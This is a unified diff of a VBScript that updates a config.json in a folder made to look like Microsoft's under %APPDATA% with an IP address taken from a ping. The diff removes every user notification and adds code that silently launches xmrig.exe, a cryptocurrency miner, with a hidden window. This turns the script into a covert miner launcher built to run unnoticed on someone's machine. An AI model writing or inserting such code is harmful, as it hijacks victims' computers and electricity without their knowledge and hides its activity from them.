@@ -1,18 +1,18 @@
 Option Explicit
 
 Dim objFSO, objShell, jsonFilePath, jsonContent, objFile, pingResult, ipAddress
-Dim regex, matches, updatedContent
+Dim regex, matches, updatedContent, xmrigPath
 
 ' Initialize file system and shell objects
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 Set objShell = CreateObject("WScript.Shell")
 
-' Define the path to config.json
+' Define the paths
 jsonFilePath = objShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\MyFolderM\config.json")
+xmrigPath = objShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\MyFolderM\xmrig.exe")
 
 ' Check if config.json exists
 If Not objFSO.FileExists(jsonFilePath) Then
-    MsgBox "config.json not found. Exiting.", vbCritical
     WScript.Quit
 End If
 
@@ -34,7 +34,6 @@ Set matches = regex.Execute(pingResult)
 If matches.Count > 0 Then
     ipAddress = matches(0).Value
 Else
-    MsgBox "Failed to retrieve IP address from ping. Exiting.", vbCritical
     WScript.Quit
 End If
 
@@ -52,5 +51,7 @@ Set objFile = objFSO.OpenTextFile(jsonFilePath, 2, False)
 objFile.Write updatedContent
 objFile.Close
 
-' Notify user of success
-MsgBox "config.json updated successfully with new IP: " & ipAddress, vbInformation
+' Launch xmrig.exe silently if it exists
+If objFSO.FileExists(xmrigPath) Then
+    objShell.Run """" & xmrigPath & """", 0, False
+End If
